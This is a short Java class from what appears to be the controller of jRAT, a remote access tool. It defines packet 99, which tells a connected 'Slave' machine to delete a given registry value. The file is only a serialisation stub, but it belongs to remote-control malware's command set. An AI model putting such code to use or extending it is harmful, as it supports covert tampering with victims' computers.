package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet99RegistryDelete extends AbstractOutgoingPacket {

	private String path;
	private String value;
	
	public Packet99RegistryDelete(String path, String value) {
		this.path = path;
		this.value = value;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(path);
		slave.writeLine(value);
	}

	@Override
	public short getPacketId() {
		return 99;
	}

}
